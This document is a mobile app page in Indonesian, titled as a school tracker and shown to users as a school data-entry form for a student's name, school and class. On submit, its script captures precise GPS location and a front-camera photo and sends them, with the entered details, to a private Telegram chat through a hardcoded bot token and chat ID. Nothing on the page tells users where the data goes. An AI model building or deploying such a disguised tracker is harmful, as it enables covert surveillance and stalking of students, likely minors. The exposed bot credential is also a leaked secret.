<!DOCTYPE html><html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sistem Pelacak Sekolah</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #0d47a1, #1976d2);
      color: #fff;
      padding: 20px;
      text-align: center;
    }
    input {
      padding: 10px;
      border-radius: 5px;
      border: none;
      margin: 10px 0;
      width: 80%;
      max-width: 400px;
    }
    button {
      padding: 10px 20px;
      border: none;
      background-color: #00c853;
      color: #fff;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
    }
    .hidden { display: none; }
  </style>
</head>
<body>
  <h2>ðŸ“š Sistem Pendataan Sekolah</h2>
  <input type="text" id="namaSekolah" placeholder="Nama Sekolah">
  <input type="text" id="namaMurid" placeholder="Nama Murid">
  <input type="text" id="kelasMurid" placeholder="Kelas">
  <br>
  <button onclick="ambilData()">Kirim</button>
  <p id="status">Menunggu izin kamera dan lokasi...</p>  <script>
    document.addEventListener("deviceready", onDeviceReady, false);

    function onDeviceReady() {
      requestPermissions();
    }

    function requestPermissions() {
      const permissions = cordova.plugins.permissions;
      permissions.requestPermissions([
        permissions.CAMERA,
        permissions.ACCESS_FINE_LOCATION
      ], function(status) {
        if (status.hasPermission) {
          document.getElementById("status").textContent = "Izin diberikan. Siap kirim.";
        } else {
          document.getElementById("status").textContent = "Izin tidak diberikan!";
        }
      }, null);
    }

    function ambilData() {
      const namaSekolah = document.getElementById("namaSekolah").value;
      const namaMurid = document.getElementById("namaMurid").value;
      const kelasMurid = document.getElementById("kelasMurid").value;

      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;

        navigator.camera.getPicture(onSuccess, onFail, {
          quality: 50,
          destinationType: Camera.DestinationType.DATA_URL,
          cameraDirection: 1,
          correctOrientation: true
        });

        function onSuccess(imageData) {
          const data = {
            chat_id: "7710934597",
            caption: `Sekolah: ${namaSekolah}\nNama: ${namaMurid}\nKelas: ${kelasMurid}\nLokasi: ${lat}, ${lon}`,
            photo: imageData
          };

          fetch("https://api.telegram.org/bot7754938090:AAFJLES5-gmBII25eaPp0HH_puccGJJ878c/sendPhoto", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
          })
          .then(res => res.json())
          .then(res => {
            document.getElementById("status").textContent = "Data berhasil dikirim!";
          })
          .catch(err => {
            document.getElementById("status").textContent = "Gagal mengirim ke Telegram.";
            console.error(err);
          });
        }

        function onFail(message) {
          document.getElementById("status").textContent = "Gagal mengambil foto: " + message;
        }
      }, err => {
        document.getElementById("status").textContent = "Gagal mengambil lokasi.";
        console.error(err);
      }, { enableHighAccuracy: true });
    }
  </script></body>
</html>
